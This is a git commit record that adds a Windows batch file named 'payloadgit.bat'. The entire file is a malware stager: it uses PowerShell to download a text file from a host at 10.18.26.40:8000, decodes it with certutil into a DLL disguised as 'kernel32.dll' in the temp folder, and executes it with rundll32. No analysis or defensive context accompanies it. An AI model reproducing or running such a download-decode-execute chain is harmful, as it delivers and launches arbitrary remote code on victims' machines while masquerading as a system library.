b336e58bb7778830d74bfd99b03df9c5515899cf
fab <59584067+FabFromTheSnow@users.noreply.github.com>
2023-04-26 22:23:15 -0400

    Create payloadgit.bat

---
+++ payloadgit.bat
@@ -0,0 +1,4 @@
+@echo off
+powershell -command "Invoke-WebRequest -Uri '10.18.26.40:8000/dll.txt' -OutFile '%temp%\dll.txt'"
+certutil -decode "%temp%\dll.txt" "%temp%\kernel32.dll"
+rundll32.exe "%temp%\kernel32.dll",DllMain
